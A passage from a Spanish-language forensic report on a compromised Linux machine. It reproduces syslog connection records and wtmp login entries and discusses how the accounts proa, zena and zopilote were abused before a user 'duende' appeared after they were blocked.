Apr  8 02:47:05 victima1 identd[32754]: started
Apr  8 04:42:09 victima1 in.telnetd[924]: connect from xxx.xxx.xxx.19
Apr  8 04:43:41 victima1 identd[934]: started
Apr  8 04:55:53 victima1 identd[1032]: started
Apr  8 05:12:42 victima1 in.telnetd[1116]: connect from xxx.xxx.xxx.19
Apr  8 05:14:44 victima1 identd[1124]: started
Apr  8 05:22:11 victima1 identd[1149]: started
Apr  8 05:29:28 victima1 in.telnetd[1233]: connect from 200.161.199.225
Apr  8 05:42:55 victima1 in.telnetd[4587]: connect from 200.161.199.225
Apr  8 06:12:11 victima1 identd[5063]: started
Apr  8 06:19:49 victima1 in.telnetd[5071]: connect from xxx.xxx.xxx.30
Apr  8 06:34:05 victima1 in.telnetd[5430]: connect from xxx.xxx.xxx.169
Apr  8 08:39:32 victima1 in.telnetd[6121]: connect from xxx.xxx.xxx.19
Apr  8 08:45:50 victima1 identd[6131]: started
Apr  8 09:58:10 victima1 in.telnetd[7010]: connect from 130.205.88.45
Apr  8 10:01:52 victima1 in.telnetd[7030]: connect from xxx.xxx.xxx.30
Apr  8 10:02:21 victima1 identd[7071]: started
Apr  8 10:04:17 victima1 in.telnetd[7097]: connect from 130.205.88.45
Apr  8 10:06:24 victima1 in.telnetd[7117]: connect from xxx.xxx.xxx.30
Apr  8 10:07:17 victima1 in.telnetd[7122]: connect from 130.205.88.45
Apr  8 10:07:42 victima1 in.qpopper[7124]: connect from 130.205.88.45
Apr  8 10:08:27 victima1 in.telnetd[7206]: connect from 130.205.88.45
Apr  8 10:09:36 victima1 in.qpopper[7223]: connect from 130.205.88.45
Apr  8 10:09:38 victima1 imapd[7224]: connect from 130.205.88.45
Apr  8 10:09:43 victima1 in.ftpd[7225]: connect from 130.205.88.45
Apr  8 10:10:05 victima1 in.telnetd[7227]: connect from 130.205.88.45
Apr  8 10:11:36 victima1 in.qpopper[7253]: connect from 130.205.88.45
Apr  8 10:12:42 victima1 in.telnetd[7256]: connect from xxx.xxx.xxx.30
Apr  8 10:56:35 victima1 in.telnetd[7514]: connect from xxx.xxx.xxx.182
Apr  8 11:09:39 victima1 identd[7835]: started
Apr  8 11:45:41 victima1 in.telnetd[8175]: connect from xxx.xxx.xxx.182
Apr  8 11:50:29 victima1 in.ftpd[8177]: connect from 202.204.105.2
Apr  8 12:01:14 victima1 in.ftpd[8267]: connect from 202.204.105.2
Apr  8 12:03:46 victima1 gdm[6229]: gdm_slave_xioerror_handler: Fatal X error - Restarting xxx.xxx.xxx.29:0
Apr  8 12:11:28 victima1 in.qpopper[8353]: connect from 130.205.88.45
Apr  8 12:21:54 victima1 in.telnetd[8372]: connect from xxx.xxx.xxx.67
Apr  8 12:24:49 victima1 in.ftpd[8453]: connect from 209.98.98.24
Apr  8 12:25:17 victima1 in.telnetd[8454]: connect from xxx.xxx.xxx.169
Apr  8 12:28:57 victima1 identd[8475]: started
Apr  8 12:45:39 victima1 in.qpopper[8729]: connect from 130.205.88.45
Apr  8 13:53:43 victima1 in.ftpd[9126]: connect from 203.252.206.7
Apr  8 13:54:56 victima1 in.ftpd[9127]: connect from 203.252.206.7
Apr  8 14:02:04 victima1 identd[9138]: started
Apr  8 14:07:51 victima1 in.telnetd[9146]: connect from 200.64.234.9
Apr  8 14:12:51 victima1 rpc.statd[20443]: Caught signal 15, un-registering and exiting.
Apr  8 14:12:52 victima1 rpc.statd[9252]: Version 1.0 Starting
Apr  8 14:14:31 victima1 identd[9268]: started
Apr  8 14:14:33 victima1 in.telnetd[9276]: connect from 158.64.21.31
Apr  8 14:14:58 victima1 telnetd[9276]: ttloop: peer died: EOF
Apr  8 14:53:59 victima1 in.ftpd[9545]: connect from 206.180.229.2
Apr  8 14:54:58 victima1 in.ftpd[9613]: connect from 206.180.229.2
Apr  8 15:47:39 victima1 in.telnetd[9867]: connect from 200.77.145.198
Apr  8 15:49:51 victima1 identd[9877]: started
Apr  8 15:56:54 victima1 in.telnetd[9966]: connect from 200.64.239.90
Apr  8 15:57:14 victima1 identd[9973]: started
Apr  8 15:58:54 victima1 in.telnetd[9999]: connect from 193.109.122.5
Apr  8 15:59:16 victima1 telnetd[9999]: ttloop: peer died: EOF
Apr  8 16:00:34 victima1 in.qpopper[10003]: connect from 200.4.13.71
Apr  8 16:00:34 victima1 in.qpopper[10007]: connect from 200.4.13.71
Apr  8 16:00:37 victima1 in.ftpd[10008]: connect from 200.4.13.71
Apr  8 16:00:59 victima1 in.ftpd[10034]: connect from 200.4.13.71
Apr  8 16:01:03 victima1 in.ftpd[10039]: connect from 217.27.173.66
Apr  8 16:01:03 victima1 in.ftpd[10042]: connect from 200.4.13.71
Apr  8 16:01:16 victima1 identd[10067]: started
Apr  8 16:01:17 victima1 in.ftpd[10075]: connect from 200.4.13.71
Apr  8 16:01:17 victima1 in.ftpd[10076]: connect from 200.4.13.71
Apr  8 16:01:21 victima1 inetd[341]: ftp/tcp server failing (looping), service terminated
Apr  8 16:07:21 victima1 in.telnetd[10083]: connect from 200.64.239.90
Apr  8 16:10:25 victima1 in.telnetd[10164]: connect from 200.64.239.90
Apr  8 16:34:10 victima1 identd[10250]: started
Apr  8 16:34:46 victima1 in.telnetd[10263]: connect from 158.64.21.31
Apr  8 16:35:10 victima1 telnetd[10263]: ttloop: peer died: EOF
Apr  8 17:52:18 victima1 in.telnetd[11819]: connect from xxx.xxx.xxx.182
Apr  8 18:31:07 victima1 in.telnetd[12226]: connect from xxx.xxx.xxx.30
Apr  8 19:52:30 victima1 gdm[31115]: gdm_slave_xioerror_handler: Fatal X error - Restarting :0
Apr  8 20:57:07 victima1 identd[13588]: started
Apr  8 20:57:09 victima1 in.telnetd[13596]: connect from 158.64.21.31
Apr  8 20:57:34 victima1 telnetd[13596]: ttloop: peer died: EOF
Apr  8 21:40:23 victima1 in.ftpd[13830]: connect from 200.95.16.4
Apr  8 22:02:11 victima1 identd[13910]: started
Apr  8 22:34:43 victima1 in.ftpd[14071]: connect from 143.248.130.145
Apr  8 22:37:02 victima1 in.ftpd[14072]: connect from 143.248.130.145
Apr  9 03:29:08 victima1 identd[15574]: started
Apr  9 05:35:15 victima1 in.telnetd[16184]: connect from xxx.xxx.xxx.19
Apr  9 05:47:28 victima1 identd[16268]: started
Apr  9 05:52:26 victima1 in.telnetd[16280]: connect from xxx.xxx.xxx.30
Apr  9 08:28:27 victima1 gnome-name-server[17694]: starting
Apr  9 08:28:27 victima1 gnome-name-server[17694]: name server starting
Apr  9 08:28:29 victima1 gnome-name-server[17701]: server_is_alive: cnx[IDL:GNOME/Panel2:1.0] = 0x8054a78
Apr  9 08:28:30 victima1 gnome-name-server[17702]: server_is_alive: cnx[IDL:GNOME/Panel2:1.0] = 0x8054c90
Apr  9 08:28:35 victima1 gnome-name-server[17706]: server_is_alive: cnx
						[IDL:GNOME/Terminal/TerminalFactory:1.0] = 0x8054f48
Apr  9 08:33:39 victima1 gnome-name-server[17694]: input condition is: 0x11, exiting
Apr  9 08:39:13 victima1 in.telnetd[17800]: connect from xxx.xxx.xxx.19
Apr  9 08:57:00 victima1 identd[17968]: started
Apr  9 09:25:29 victima1 in.telnetd[18187]: connect from 158.64.21.31
Apr  9 09:25:56 victima1 telnetd[18187]: ttloop: peer died: EOF
Apr  9 09:30:13 victima1 identd[18188]: started
Apr  9 10:49:00 victima1 gnome-name-server[19077]: name server starting
Apr  9 10:49:02 victima1 gnome-name-server[19081]: server_is_alive: cnx[IDL:GNOME/Panel2:1.0] = 0x8054a88
Apr  9 10:49:02 victima1 gnome-name-server[19086]: server_is_alive: cnx[IDL:GNOME/Panel2:1.0] = 0x8054e58
Apr  9 10:49:02 victima1 gnome-name-server[19087]: server_is_alive: cnx[IDL:GNOME/Panel2:1.0] = 0x8055068
Apr  9 10:49:15 victima1 in.telnetd[19106]: connect from xxx.xxx.xxx.19
Apr  9 10:49:22 victima1 gnome-name-server[19112]: server_is_alive: cnx
						[IDL:GNOME/Terminal/TerminalFactory:1.0] = 0x8055340
Apr  9 10:55:18 victima1 gnome-name-server[19077]: input condition is: 0x11, exiting
Apr  9 10:58:46 victima1 identd[19221]: started
Apr  9 11:13:01 victima1 in.telnetd[19328]: connect from xxx.xxx.xxx.169
Apr  9 11:14:09 victima1 in.ftpd[19344]: connect from 203.232.129.17
Apr  9 11:18:03 victima1 in.telnetd[19385]: connect from xxx.xxx.xxx.30
Apr  9 11:19:33 victima1 identd[19388]: started
Apr  9 11:21:34 victima1 in.telnetd[19397]: connect from xxx.xxx.xxx.169
Apr  9 11:57:57 victima1 in.ftpd[19644]: connect from 143.248.130.145
Apr  9 12:25:50 victima1 identd[19801]: started
Apr  9 12:25:52 victima1 in.telnetd[19809]: connect from 158.64.21.31
Apr  9 12:26:14 victima1 in.telnetd[19816]: connect from 200.64.234.180
Apr  9 12:26:21 victima1 telnetd[19809]: ttloop: peer died: EOF
Apr  9 12:27:17 victima1 in.telnetd[19823]: connect from 200.64.234.180
Apr  9 12:27:34 victima1 in.telnetd[19827]: connect from xxx.xxx.xxx.19
Apr  9 12:30:07 victima1 identd[19840]: started
Apr  9 12:48:54 victima1 in.ftpd[19947]: connect from 200.95.9.238
Apr  9 12:48:54 victima1 in.ftpd[19948]: connect from 200.95.9.238
Apr  9 12:48:54 victima1 in.ftpd[19949]: connect from 200.95.9.238
Apr  9 12:50:23 victima1 inetd[341]: ftp/tcp server failing (looping), service terminated
Apr  9 12:56:42 victima1 in.telnetd[20099]: connect from 200.64.234.180
Apr  9 12:57:31 victima1 telnetd[20099]: ttloop: peer died: EOF
Apr  9 13:00:22 victima1 in.telnetd[20101]: connect from xxx.xxx.xxx.169
Apr  9 13:00:46 victima1 in.telnetd[20103]: connect from xxx.xxx.xxx.30
Apr  9 13:12:15 victima1 identd[20180]: started
Apr  9 13:29:25 victima1 in.telnetd[20267]: connect from xxx.xxx.xxx.19
Apr  9 13:34:00 victima1 in.ftpd[20270]: connect from 200.77.148.157
Apr  9 13:34:01 victima1 in.ftpd[20273]: connect from 200.77.148.157
Apr  9 13:34:41 victima1 inetd[341]: ftp/tcp server failing (looping), service terminated
Apr  9 14:00:41 victima1 identd[20477]: started
Apr  9 14:00:42 victima1 in.telnetd[20485]: connect from 158.64.21.31
Apr  9 14:01:08 victima1 telnetd[20485]: ttloop: peer died: EOF
Apr  9 14:26:14 victima1 in.ftpd[20709]: connect from 206.54.244.5
Apr  9 14:40:04 victima1 in.telnetd[20846]: connect from xxx.xxx.xxx.67
Apr  9 16:49:13 victima1 identd[21496]: started
Apr  9 18:41:50 victima1 in.telnetd[22502]: connect from 193.109.122.5
Apr  9 18:42:08 victima1 telnetd[22502]: ttloop: peer died: EOF
Apr  9 18:55:06 victima1 identd[22609]: started
Apr 10 05:37:45 victima1 in.telnetd[25844]: connect from xxx.xxx.xxx.19
Apr 10 05:42:07 victima1 identd[25928]: started
Apr 10 08:20:07 victima1 in.ftpd[27017]: connect from 143.248.130.145
Apr 10 08:33:40 victima1 in.telnetd[27093]: connect from xxx.xxx.xxx.19
Apr 10 08:38:03 victima1 identd[27182]: started
Apr 10 08:40:58 victima1 in.ftpd[27190]: connect from 132.248.11.1
Apr 10 08:55:14 victima1 in.telnetd[27281]: connect from xxx.xxx.xxx.19
Apr 10 09:08:05 victima1 identd[27375]: started
Apr 10 10:03:08 victima1 in.telnetd[27825]: connect from xxx.xxx.xxx.19
Apr 10 10:03:49 victima1 identd[27845]: started
Apr 10 10:06:17 victima1 gnome-name-server[27920]: starting
Apr 10 10:06:17 victima1 gnome-name-server[27920]: name server starting
Apr 10 10:07:21 victima1 identd[27946]: started
Apr 10 10:39:55 victima1 gnome-name-server[27920]: input condition is: 0x11, exiting
Apr 10 11:25:51 victima1 in.ftpd[28565]: connect from xxx.xxx.xxx.15
Apr 10 11:28:15 victima1 in.telnetd[28574]: connect from xxx.xxx.xxx.19
Apr 10 11:28:53 victima1 in.telnetd[28579]: connect from xxx.xxx.xxx.169
Apr 10 11:28:58 victima1 identd[28586]: started
Apr 10 12:05:51 victima1 in.telnetd[29039]: connect from xxx.xxx.xxx.19
Apr 10 13:21:34 victima1 in.telnetd[29449]: connect from xxx.xxx.xxx.30
Apr 10 13:56:02 victima1 identd[29679]: started
Apr 10 14:42:41 victima1 identd[29937]: started
Apr 10 14:45:56 victima1 in.telnetd[29945]: connect from 200.77.145.217
Apr 10 14:47:01 victima1 identd[29955]: started
Apr 10 15:16:39 victima1 in.ftpd[30179]: connect from 206.54.244.5
Apr 10 15:55:49 victima1 in.ftpd[30529]: connect from 206.54.244.5
Apr 10 15:58:23 victima1 in.ftpd[30531]: connect from 206.54.244.5
Apr 10 15:59:06 victima1 in.ftpd[30533]: connect from 200.67.154.121
Apr 10 15:59:06 victima1 in.ftpd[30534]: connect from 200.67.154.121
Apr 10 16:00:12 victima1 inetd[341]: ftp/tcp server failing (looping), service terminated
Apr 10 16:11:41 victima1 in.ftpd[30674]: connect from 158.97.15.22
Apr 10 16:12:33 victima1 in.ftpd[30683]: connect from 206.54.244.5
Apr 10 17:12:22 victima1 identd[30989]: started
Apr 10 17:35:37 victima1 identd[31100]: started
Apr 10 17:52:35 victima1 in.telnetd[31184]: connect from xxx.xxx.xxx.2
Apr 10 18:58:22 victima1 in.telnetd[31578]: connect from 148.221.161.121
Apr 10 19:12:19 victima1 identd[31661]: started
Apr 10 19:36:21 victima1 in.telnetd[31803]: connect from xxx.xxx.xxx.1
Apr 10 20:08:28 victima1 identd[32051]: started
Apr 10 21:59:25 victima1 identd[32591]: started
Apr 10 22:27:11 victima1 identd[32754]: started
Apr 10 22:31:32 victima1 in.telnetd[32764]: connect from 193.109.122.5
Apr 10 22:31:54 victima1 telnetd[32764]: ttloop: peer died: EOF
Apr 10 22:59:08 victima1 identd[459]: started
Apr 10 23:32:49 victima1 identd[640]: started
Apr 11 00:33:56 victima1 identd[958]: started
Apr 11 05:49:11 victima1 in.telnetd[2568]: connect from xxx.xxx.xxx.19
Apr 11 05:50:46 victima1 identd[2579]: started
Apr 11 06:22:13 victima1 in.telnetd[2736]: connect from xxx.xxx.xxx.30
Apr 11 06:25:40 victima1 in.telnetd[2893]: connect from xxx.xxx.xxx.169
Apr 11 06:47:50 victima1 in.telnetd[3187]: connect from xxx.xxx.xxx.30
Apr 11 06:57:07 victima1 identd[3274]: started
Apr 11 07:02:38 victima1 in.telnetd[3282]: connect from xxx.xxx.xxx.30
Apr 11 07:09:39 victima1 in.telnetd[3359]: connect from xxx.xxx.xxx.169
Apr 11 07:27:03 victima1 identd[3441]: started
Apr 11 07:59:12 victima1 in.telnetd[3617]: connect from xxx.xxx.xxx.19
Apr 11 08:17:15 victima1 identd[3732]: started
Apr 11 09:35:09 victima1 in.telnetd[4474]: connect from xxx.xxx.xxx.19
Apr 11 09:41:11 victima1 identd[4556]: started
Apr 11 09:46:11 victima1 identd[4574]: started
Apr 11 09:57:30 victima1 in.telnetd[4678]: connect from xxx.xxx.xxx.182
Apr 11 10:36:39 victima1 identd[4844]: started
Apr 11 11:07:11 victima1 in.telnetd[5045]: connect from xxx.xxx.xxx.19
Apr 11 11:18:24 victima1 identd[5129]: started
Apr 11 11:27:10 victima1 in.telnetd[5211]: connect from xxx.xxx.xxx.169
Apr 11 11:28:21 victima1 in.ftpd[5218]: connect from 207.202.14.246
Apr 11 11:37:58 victima1 in.ftpd[5232]: connect from 207.202.14.246
Apr 11 11:49:03 victima1 identd[5308]: started
Apr 11 11:50:32 victima1 in.telnetd[5321]: connect from xxx.xxx.xxx.169
Apr 11 12:15:53 victima1 in.telnetd[5540]: connect from 172.156.6.178
Apr 11 12:20:05 victima1 identd[5543]: started
Apr 11 12:32:49 victima1 in.telnetd[5639]: connect from xxx.xxx.xxx.169
Apr 11 12:43:40 victima1 in.ftpd[5718]: connect from 200.67.232.195
Apr 11 12:43:55 victima1 in.telnetd[5719]: connect from 200.67.232.195
Apr 11 12:44:48 victima1 in.telnetd[5721]: connect from 200.67.232.195
Apr 11 12:55:34 victima1 identd[5804]: started
Apr 11 12:57:18 victima1 in.telnetd[5812]: connect from xxx.xxx.xxx.19
Apr 11 13:13:05 victima1 in.telnetd[5894]: connect from xxx.xxx.xxx.169
Apr 11 13:43:30 victima1 identd[6049]: started
Apr 11 13:43:56 victima1 in.telnetd[6057]: connect from 148.240.170.85
Apr 11 13:44:36 victima1 in.telnetd[6059]: connect from 200.64.137.152
Apr 11 13:45:16 victima1 in.telnetd[6061]: connect from 200.64.137.152
Apr 11 14:09:10 victima1 identd[6239]: started
Apr 11 14:53:34 victima1 in.telnetd[6495]: connect from 206.54.244.5
Apr 11 14:54:32 victima1 modprobe: modprobe: Can't locate module net-pf-14
Apr 11 14:55:08 victima1 in.ftpd[6535]: connect from 63.166.196.66
Apr 11 14:56:18 victima1 in.telnetd[6659]: connect from 127.0.0.1
Apr 11 15:13:59 victima1 identd[6778]: started
Apr 11 15:51:48 victima1 in.ftpd[7022]: connect from 210.243.151.51
Apr 11 15:53:02 victima1 identd[7099]: started
Apr 11 15:58:11 victima1 in.ftpd[7117]: connect from 165.132.121.22
Apr 11 16:00:25 victima1 identd[7118]: started
Apr 11 16:00:40 victima1 in.ftpd[7127]: connect from 64.21.201.10
Apr 11 16:04:56 victima1 identd[7132]: started
Apr 11 18:13:05 victima1 in.ftpd[8110]: connect from 216.181.68.98
Apr 11 18:16:07 victima1 in.ftpd[8112]: connect from 216.181.68.98
Apr 11 18:18:48 victima1 identd[8115]: started
Apr 11 18:19:52 victima1 in.ftpd[8124]: connect from 216.181.68.98
Apr 11 18:20:59 victima1 identd[8129]: started
Apr 11 18:21:52 victima1 in.telnetd[8138]: connect from 200.77.144.186
Apr 11 18:22:17 victima1 in.telnetd[8141]: connect from 200.77.144.186
Apr 11 18:25:14 victima1 identd[8225]: started
Apr 11 18:28:43 victima1 in.ftpd[8243]: connect from 216.181.68.98
Apr 11 18:29:06 victima1 in.ftpd[8244]: connect from 216.181.68.98
Apr 11 18:31:53 victima1 identd[8249]: started
Apr 11 20:22:38 victima1 in.telnetd[9009]: connect from 200.77.144.186
Apr 11 20:26:22 victima1 identd[9160]: started
Apr 11 23:00:52 victima1 in.ftpd[10251]: connect from 210.243.151.51
Apr 11 23:01:45 victima1 identd[10252]: started
Apr 11 23:06:00 victima1 identd[10269]: started
Apr 11 23:13:19 victima1 identd[10355]: started
Apr 11 23:14:30 victima1 in.ftpd[10364]: connect from 64.21.201.10
Apr 11 23:15:37 victima1 identd[10365]: started
Apr 12 04:25:25 victima1 in.ftpd[12629]: connect from 200.65.24.249
Apr 12 04:25:25 victima1 in.ftpd[12630]: connect from 200.65.24.249
Apr 12 04:26:15 victima1 identd[12684]: started
Apr 12 05:17:33 victima1 in.telnetd[13015]: connect from 193.109.122.5
Apr 12 05:17:55 victima1 telnetd[13015]: ttloop: peer died: EOF
Apr 12 05:21:00 victima1 identd[13016]: started
Apr 12 09:13:27 victima1 in.telnetd[14525]: connect from 172.156.189.237
Apr 12 09:13:29 victima1 identd[14528]: started
Apr 12 10:06:34 victima1 in.ftpd[15003]: connect from 217.27.173.66
Apr 12 10:06:45 victima1 identd[15004]: started
Apr 12 11:30:26 victima1 in.ftpd[15674]: connect from 200.77.151.50
Apr 12 11:30:27 victima1 in.telnetd[15676]: connect from 200.77.151.50
Apr 12 11:30:27 victima1 telnetd[15676]: ttloop: peer died: EOF
Apr 12 11:32:37 victima1 identd[15677]: started
Apr 12 12:29:52 victima1 gdm[15990]: gdm_slave_xioerror_handler: Fatal X error - 
					Restarting xxx.xxx.xxx.29:0
Apr 12 12:32:46 victima1 identd[16018]: started
Apr 12 14:49:01 victima1 in.telnetd[17064]: connect from 172.200.30.195
Apr 12 14:50:17 victima1 identd[17068]: started
Apr 12 16:20:45 victima1 in.telnetd[17724]: connect from 200.77.148.46
Apr 12 16:22:57 victima1 identd[17731]: started
Apr 12 17:00:51 victima1 in.telnetd[18071]: connect from 200.77.148.46
Apr 12 17:01:29 victima1 identd[18076]: started
Apr 12 17:04:37 victima1 in.telnetd[18100]: connect from 200.77.148.46
Apr 12 17:11:16 victima1 identd[18111]: started
Apr 12 18:02:45 victima1 in.ftpd[18483]: connect from 200.77.148.227
Apr 12 18:02:45 victima1 in.ftpd[18484]: connect from 200.77.148.227
Apr 12 18:03:21 victima1 inetd[341]: ftp/tcp server failing (looping), service terminated
Apr 12 18:04:44 victima1 identd[18525]: started
Apr 12 19:05:23 victima1 in.telnetd[19165]: connect from xxx.xxx.xxx.182
Apr 12 19:08:10 victima1 identd[19254]: started
Apr 12 20:11:31 victima1 in.telnetd[19557]: connect from 200.77.146.145
Apr 12 20:15:27 victima1 identd[19575]: started
Apr 13 12:57:39 victima1 in.ftpd[26399]: connect from 200.64.162.241
Apr 13 12:57:39 victima1 in.ftpd[26400]: connect from 200.64.162.241
Apr 13 12:58:25 victima1 inetd[341]: ftp/tcp server failing (looping), service terminated
Apr 13 13:05:35 victima1 identd[26483]: started
Apr 13 14:47:31 victima1 identd[27058]: started
Apr 13 15:25:38 victima1 in.telnetd[27293]: connect from 216.22.46.29
Apr 13 15:25:44 victima1 in.ftpd[27294]: connect from 216.22.46.29
Apr 13 15:25:47 victima1 telnetd[27293]: ttloop: peer died: EOF
Apr 13 15:50:48 victima1 in.telnetd[27377]: connect from 200.77.147.219
Apr 13 15:52:18 victima1 in.telnetd[27386]: connect from 200.77.147.219
Apr 13 15:52:49 victima1 identd[27393]: started
Apr 13 15:55:55 victima1 in.telnetd[27478]: connect from 200.77.147.219
Apr 13 15:59:08 victima1 in.ftpd[27483]: connect from 200.95.16.252
Apr 13 15:59:08 victima1 in.ftpd[27484]: connect from 200.95.16.252
Apr 13 16:46:01 victima1 inetd[341]: ftp/tcp server failing (looping), service terminated
Apr 13 18:46:14 victima1 in.ftpd[29570]: connect from 195.57.229.18
Apr 13 19:55:30 victima1 identd[29884]: started
Apr 13 20:30:09 victima1 in.telnetd[30046]: connect from xxx.xxx.xxx.182
Apr 13 22:16:12 victima1 in.telnetd[30378]: connect from 172.161.66.253
Apr 14 01:00:30 victima1 in.ftpd[31195]: connect from 172.183.39.138
Apr 14 04:01:52 victima1 identd[32061]: started
Apr 14 05:45:39 victima1 in.telnetd[32638]: connect from xxx.xxx.xxx.19
Apr 14 05:55:49 victima1 identd[32727]: started
Apr 14 13:38:53 victima1 in.ftpd[2984]: connect from 172.176.6.51
Apr 15 15:07:32 victima1 in.telnetd[11057]: connect from 200.77.149.89
Apr 15 15:08:09 victima1 in.telnetd[11157]: connect from 200.77.149.89
Apr 15 15:18:56 victima1 identd[11245]: started
Apr 15 15:35:22 victima1 in.telnetd[11384]: connect from 200.77.149.89
Apr 15 15:36:26 victima1 in.telnetd[11387]: connect from 200.77.149.89
Apr 15 15:36:48 victima1 identd[11395]: started
Apr 15 15:37:34 victima1 in.ftpd[11408]: connect from 211.22.23.226
Apr 15 15:46:13 victima1 in.ftpd[11499]: connect from 217.88.157.252
Apr 15 15:49:23 victima1 identd[11507]: started
Apr 15 15:51:14 victima1 in.ftpd[11515]: connect from 211.22.23.226
Apr 15 15:53:47 victima1 in.ftpd[11594]: connect from 210.243.151.51
Apr 15 15:54:18 victima1 in.ftpd[11595]: connect from 210.243.151.51
Apr 15 16:18:33 victima1 in.ftpd[11680]: connect from 61.221.27.214
Apr 15 18:05:08 victima1 in.telnetd[12313]: connect from 200.95.126.103
Apr 15 18:06:25 victima1 identd[12320]: started
Apr 15 18:15:11 victima1 identd[12365]: started
Apr 15 18:16:07 victima1 in.telnetd[12373]: connect from 200.67.41.174
Apr 15 18:25:13 victima1 identd[12457]: started
Apr 15 18:28:02 victima1 telnetd[12373]: ttloop: peer died: EOF
Apr 15 18:33:10 victima1 in.telnetd[12467]: connect from 148.221.133.222
\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm

  En las l'ineas anteriores se observa la gran actividad de las cuentas
proa, zopilote y zena. El acceso a estas cuentas fue bloqueado el d'ia
15 de abril, esto detuvo el uso de los servicios plantados en el
sistema, y es aqu'i donde se detectaron las acciones del usuario
duende. Los servicios \verb+ftp+, \verb+telnet+, \verb+smtp+ entre otros son los que se
estuvieron explotando hasta esas fechas. Es de destacar que las
conexiones provienen de muchas m'aquinas de todo el mundo lo cual es
normal en este tipo de ataques. Es cotidiano observar accesos de este
estilo provenientes de m'aquinas alrededor del mundo. Pero no se descarta
la falsificaci'on de las direcciones de red para disfrazar un ataque local e
intentar enga�ar a los administradores o investigadores.

 No hay registros que indiquen que el usuario duende haya usado la
m'aquina antes del da 15 de abril, y es precisamente cuando se vigilan
o bloquean las cuentas de proa, zena y zopilote, que se registra
actividad de este usuario. Se piensa que su actividad pudo ser
eliminada de los registros en los d'ias anteriores por los m'etodos que
ya se enunciaron.


\verb+wtmp+

\vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim}
duende  pts/0        Mon Apr 28 03:39 - 03:40  (00:00)     victima2.foo.bar.mx
duende  pts/1        Sun Apr 27 22:27 - 22:29  (00:01)     victima2.foo.bar.mx
duende  pts/1        Sun Apr 27 22:19 - 22:19  (00:00)     victima2.foo.bar.mx
duende  pts/1        Sun Apr 27 19:07 - 19:07  (00:00)     victima2.foo.bar.mx
duende  pts/0        Sun Apr 27 15:32 - 15:32  (00:00)     victima2.foo.bar.mx
duende  pts/0        Sun Apr 27 15:06 - 15:08  (00:02)     victima2.foo.bar.mx
reboot   system boot  Sun Apr 27 04:42         (1+06:49)    2.4.18-bf2.4
duende  pts/3        Sun Apr 27 04:27 - 04:29  (00:01)     victima2.foo.bar.mx
duende  pts/2        Sun Apr 27 01:20 - 01:39  (00:18)     dsl-200-78-118-164.prodigy.net.mx
reboot   system boot  Sat Apr 26 22:52          (05:49)     2.4.18-bf2.4
reboot   system boot  Sat Apr 26 22:48          (05:53)     2.4.18-bf2.4
reboot   system boot  Sat Apr 26 22:38          (00:08)     2.4.18-bf2.4
duende  pts/6        Sat Apr 26 04:09 - 06:21  (02:12)     victima2.foo.bar.mx
duende  pts/7        Sat Apr 26 02:04 - 02:07  (00:03)     victima2.foo.bar.mx
duende  pts/5        Fri Apr 25 21:50 - 21:55  (00:05)     victima2.foo.bar.mx
duende  pts/4        Fri Apr 25 20:19 - 20:21  (00:02)     victima2.foo.bar.mx
duende  pts/9        Fri Apr 25 18:03 - 18:06  (00:02)     victima2.foo.bar.mx
duende  pts/7        Fri Apr 25 18:02 - 18:10  (00:08)     victima2.foo.bar.mx
duende  pts/5        Fri Apr 25 15:43 - 15:45  (00:02)     victima2.foo.bar.mx
duende  pts/3        Fri Apr 25 15:27 - 15:43  (00:16)     victima2.foo.bar.mx
duende  pts/3        Fri Apr 25 15:24 - 15:25  (00:00)     victima2.foo.bar.mx
duende  pts/3        Fri Apr 25 14:19 - 15:09  (00:49)     victima2.foo.bar.mx
duende  pts/4        Fri Apr 25 14:10 - 15:10  (00:59)     victima2.foo.bar.mx
duende  pts/3        Fri Apr 25 05:05 - 05:07  (00:02)     victima2.foo.bar.mx
duende  pts/2        Thu Apr 24 23:22 - 23:24  (00:01)     victima2.foo.bar.mx
duende  pts/2        Thu Apr 24 23:17 - 23:19  (00:01)     victima2.foo.bar.mx
duende  pts/1        Thu Apr 24 20:30 - 20:30  (00:00)     victima2.foo.bar.mx
duende  pts/1        Thu Apr 24 16:49 - 16:50  (00:00)     victima2.foo.bar.mx
duende  pts/3        Thu Apr 24 03:59 - 04:02  (00:02)     victima2.foo.bar.mx
reboot   system boot  Thu Apr 24 01:22         (2+05:43)    2.4.18-bf2.4
reboot   system boot  Thu Apr 24 01:17         (2+05:48)    2.4.18-bf2.4
duende  pts/0        Thu Apr 24 01:14 - 01:14  (00:00)     dsl-200-67-75-152.prodigy.net.mx
duende  pts/5        Wed Apr 23 23:18 - 23:29  (00:10)     victima2.foo.bar.mx
duende  pts/5        Wed Apr 23 23:06 - 23:17  (00:11)     victima2.foo.bar.mx
duende  pts/11       Wed Apr 23 22:57 - 23:05  (00:07)     victima2.foo.bar.mx
duende  pts/2        Wed Apr 23 22:47 - 23:28  (00:41)     victima2.foo.bar.mx
duende  pts/1        Wed Apr 23 22:19 - 22:22  (00:03)     victima2.foo.bar.mx
zena     ftp          Wed Apr 23 21:24 - 21:25  (00:00)     victima2.foo.bar.mx
duende  pts/2        Wed Apr 23 18:55 - 19:01  (00:05)     victima2.foo.bar.mx
duende  pts/1        Wed Apr 23 16:06 - 16:08  (00:01)     victima2.foo.bar.mx
duende  pts/2        Wed Apr 23 03:06 - 03:19  (00:13)     victima2.foo.bar.mx
bob  pts/1        Wed Apr 23 02:42 - 13:55  (11:12)     xxx.xxx.xxx.182
fired  pts/2        Tue Apr 22 23:19 - 23:19  (00:00)     victima2.foo.bar.mx
zena     ftp          Tue Apr 22 23:16 - 23:16  (00:00)     pepe.rutgers.edu
duende  pts/1        Tue Apr 22 23:04 - 23:05  (00:01)     victima2.foo.bar.mx
zena     pts/1        Tue Apr 22 22:55 - 23:04  (00:08)     dup-200-64-59-119.prodigy.net.mx
zena     pts/0        Tue Apr 22 22:50 - 01:14 (1+02:24)    dup-200-64-59-119.prodigy.net.mx
zena     pts/0        Tue Apr 22 22:44 - 22:50  (00:05)     dup-200-64-59-119.prodigy.net.mx
duende  pts/1        Tue Apr 22 19:45 - 19:46  (00:01)     victima2.foo.bar.mx
duende  pts/0        Tue Apr 22 14:04 - 14:06  (00:01)     victima2.foo.bar.mx
duende  pts/1        Tue Apr 22 04:52 - 04:55  (00:02)     victima2.foo.bar.mx
bob  pts/0        Tue Apr 22 04:52 - 13:33  (08:41)     xxx.xxx.xxx.182
